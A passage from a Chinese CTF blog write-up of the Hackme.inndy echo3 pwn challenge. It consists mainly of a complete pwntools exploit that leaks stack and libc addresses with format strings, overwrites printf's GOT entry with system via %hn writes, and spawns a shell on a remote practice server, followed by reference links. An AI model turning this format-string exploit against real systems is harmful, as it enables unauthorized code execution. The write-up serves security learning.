+ <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(system &amp; <span class="number">0xffff</span>,<span class="number">20</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>) ,<span class="number">21</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="3月19号下午针对echo3的新更新……"><a href="#3月19号下午针对echo3的新更新……" class="headerlink" title="3月19号下午针对echo3的新更新……"></a>3月19号下午针对echo3的新更新……</h1><p>晚上做梦梦到好像有人告诉我这道题应该用LibcSearcher来弄libc…试了一下…果然可以!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#c = remote('hackme.inndy.tw',7720)    </span></span><br><span class="line">    c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25796</span>)</span><br><span class="line">    <span class="comment">#c = process("./echo3")</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    c.sendline(<span class="string">'%43$p.%30$p='</span>)</span><br><span class="line">    lsm = c.recvuntil(<span class="string">'.'</span>,drop = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> lsm[<span class="number">-3</span>:] == <span class="string">'637'</span>:</span><br><span class="line">        libc_start_main = int(lsm,<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">        success(<span class="string">'OK!'</span>)</span><br><span class="line">        success(<span class="string">'lsm = '</span> + lsm)</span><br><span class="line">        addr = int(c.recvuntil(<span class="string">'='</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">'addr = '</span> + hex(addr))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    c.close()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./echo3'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so.i386')</span></span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line">libcbase = libc_start_main - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line"><span class="comment">#libcbase = libc_start_main - libc.symbols['__libc_start_main']</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line"><span class="comment">#system = libcbase + libc.symbols['system']</span></span><br><span class="line">system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">success(<span class="string">'printf_got = '</span> + hex(printf_got))</span><br><span class="line">success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_table = addr<span class="number">-0x10c</span></span><br><span class="line">success(<span class="string">'got_table = '</span> + hex(got_table))</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(got_table &amp; <span class="number">0xffff</span>,<span class="number">30</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">4</span> , <span class="number">31</span>) + <span class="string">'1111'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'1111'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(printf_got &amp; <span class="number">0xffff</span>,<span class="number">87</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(<span class="number">2</span>,<span class="number">85</span>) + <span class="string">'2222'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'2222'</span>)</span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(system &amp; <span class="number">0xffff</span>,<span class="number">20</span>)</span><br><span class="line">payload += <span class="string">'%&#123;&#125;c%&#123;&#125;$hn'</span>.format(((system&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system &amp; <span class="number">0xffff</span>) ,<span class="number">21</span>) + <span class="string">'3333'</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">c.recvuntil(<span class="string">'3333'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200319175220.png" alt></p><p>libc选的这个</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.cnblogs.com/ZHijack/p/8687182.html" target="_blank" rel="noopener">博客园</a></p><p><a href="https://www.aloxaf.com/2018/07/hackme_inndy/#echo2" target="_blank" rel="noopener">传送门</a></p><p><a href="https://xz.aliyun.com/t/3700#toc-7" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/9329387.html" target="_blank" rel="noopener">Freebuf</a></p><p><a href="https://xz.aliyun.com/t/7110#toc-18" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://www.jianshu.com/p/76152d477322" target="_blank" rel="noopener">简书</a></p><p><a href="https://www.lyyl.online/2019/10/24/HackMe%E4%B8%AD%E7%9A%84echo3/" target="_blank" rel="noopener">传送门</a></p><p><a href="https://carlstar.club/2019/01/02/echo3/#idea" target="_blank" rel="noopener">传送门</a></p><hr><p>和指定libc有关的参考链接</p><p><a href="https://blog.csdn.net/think_ycx/article/details/78005083" target="_blank" rel="noopener">CSDN</a></p><p><a href="http://www.jx-zhang.xyz/2018/01/13/fmtstr" target="_blank" rel="noopener">传送门</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm" target="_blank" rel="noopener">陈老板的看雪文章</a></p><p><a href="https://github.com/NixOS/patchelf" target="_blank" rel="noopener">patchelf</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/74006495_p0.jpg" alt></p></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------至此本文结束<i class="fa fa-tree"></i>感谢您的阅读-------------</div></div></div><div><div id="reward-container"><div>如果觉得这篇文章对您有用，请随意打赏。 (๑•⌄•๑) 您的支持将鼓励我继续创作！</div><button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/Wechat_SKM.png" alt="LiuLian 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/ZFB_SKM.png" alt="LiuLian 支付宝"><p>支付宝</p></div></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>LiuLian</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/" title="[Hackme.inndy]echo/echo2/echo3">http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2020/03/14/栈迁移-ACTF-2019-babystack/" rel="next" title="[栈迁移]ACTF_2019_babystack"><i class="fa fa-chevron-left"></i> [栈迁移]ACTF_2019_babystack</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/" rel="prev" title="[Python]生成斐波那契数列的几种方式的对比与分析">[Python]生成斐波那契数列的几种方式的对比与分析 <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="LiuLian"><p class="site-author-name" itemprop="name">LiuLian</p><div class="site-description motion-element" itemprop="description">Salute The Time</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">60</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">分类</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/LiuL14n" title="GitHub &rarr; https://github.com/LiuL14n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" title="E-Mail &rarr; http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a> </span><span class="links-of-author-item"><a href="http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-block"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> From 大佬 import&nbsp; <i class="fa fa-fw fa-link"></i></div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://suxinghe39.github.io/" title="SuXingHe" target="_blank">SuXingHe</a></li><li class="links-of-blogroll-item"><a href="https://hal900000.github.io" title="Hal90000" target="_blank">Hal90000</a></li><li class="links-of-blogroll-item"><a href="http://n4tsu.top/" title="Natsu" target="_blank">Natsu</a></li><li class="links-of-blogroll-item"><a href="https://dililidala.github.io" title="Ohrxw" target="_blank">Ohrxw</a></li><li class="links-of-blogroll-item"><a href="http://www.wendev.site" title="JiangWen" target="_blank">JiangWen</a></li><li class="links-of-blogroll-item"><a href="https://l0ne1y.xyz/" title="L0ne1y" target="_blank">L0ne1y</a></li></ul><div id="days"></div><script>function show_date_time(){window.setTimeout("show_date_time()",1e3),BirthDay=new Date("04/25/2019 21:13:14"),today=new Date,timeold=today.getTime()-BirthDay.getTime(),sectimeold=timeold/1e3,secondsold=Math.floor(sectimeold),msPerDay=864e5,e_daysold=timeold/msPerDay,daysold=Math.floor(e_daysold),e_hrsold=24*(e_daysold-daysold),hrsold=setzero(Math.floor(e_hrsold)),e_minsold=60*(e_hrsold-hrsold),minsold=setzero(Math.floor(60*(e_hrsold-hrsold))),seconds=setzero(Math.floor(60*(e_minsold-minsold))),document.getElementById("days").innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒"}function setzero(e){return e<10&&(e="0"+e),e}show_date_time()</script></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-echo"><span class="nav-number">2.</span> <span class="nav-text">0x01 echo</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">2.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-echo2"><span class="nav-number">3.</span> <span class="nav-text">0x02 echo2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Do-it！"><span class="nav-number">3.2.</span> <span class="nav-text">Do it！</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露程序加载地址"><span class="nav-number">3.2.1.</span> <span class="nav-text">泄露程序加载地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造payload-amp-getshell"><span class="nav-number">3.2.2.</span> <span class="nav-text">构造payload&amp;getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">3.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-echo3"><span class="nav-number">4.</span> <span class="nav-text">0x03 echo3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-2"><span class="nav-number">4.1.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#找跳板的原因？"><span class="nav-number">4.1.1.</span> <span class="nav-text">找跳板的原因？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Do-it"><span class="nav-number">4.2.</span> <span class="nav-text">Do it!</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在前面"><span class="nav-number">4.2.1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#遇到的困难-未解决-3月19号已解决。"><span class="nav-number">4.2.2.</span> <span class="nav-text">遇到的困难 (未解决)//3月19号已解决。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路-1"><span class="nav-number">4.2.3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露栈地址和libcbase"><span class="nav-number">4.2.4.</span> <span class="nav-text">泄露栈地址和libcbase</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#找跳板"><span class="nav-number">4.2.5.</span> <span class="nav-text">找跳板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整EXP"><span class="nav-number">4.2.6.</span> <span class="nav-text">完整EXP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3月19日凌晨针对echo3的新更新"><span class="nav-number">5.</span> <span class="nav-text">3月19日凌晨针对echo3的新更新</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3月19号下午针对echo3的新更新……"><span class="nav-number">6.</span> <span class="nav-text">3月19号下午针对echo3的新更新……</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-参考链接"><span class="nav-number">7.</span> <span class="nav-text">0x04 参考链接</span></a></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span> <span class="with-love" id="animate"><i class="fa fa-star"></i> </span><span class="author" itemprop="copyrightHolder">LiuLian</span></div><div class="powered-by"><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-s"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="255,105,180" opacity="0.6" zindex="-1" count="77" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=2.1.3"></script><script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/js/utils.js?v=7.1.0"></script><script src="/js/motion.js?v=7.1.0"></script><script src="/js/affix.js?v=7.1.0"></script><script src="/js/schemes/pisces.js?v=7.1.0"></script><script src="/js/scrollspy.js?v=7.1.0"></script><script src="/js/post-details.js?v=7.1.0"></script><script src="/js/next-boot.js?v=7.1.0"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>$(".highlight").each(function(e,t){var n=$("<div>").addClass("highlight-wrap");$(t).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(e){var t=$(this).parent().find(".code").find(".line").map(function(e,t){return $(t).text()}).toArray().join("\n"),n=document.createElement("textarea"),o=window.pageYOffset||document.documentElement.scrollTop;n.style.top=o+"px",n.style.position="absolute",n.style.opacity="0",n.readOnly=!0,n.value=t,document.body.appendChild(n),n.select(),n.setSelectionRange(0,t.length),n.readOnly=!1;document.execCommand("copy");n.blur(),$(this).blur()})).on("mouseleave",function(e){var t=$(this).find(".copy-btn");setTimeout(function(){t.text("复制")},300)}).append(t)})</script><script type="text/javascript" color="0,191,255" opacity="1" zindex="-2" count="60" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/z16.model.json"},display:{position:"right",width:210,height:420},mobile:{show:!0},log:!1})</script></body></html>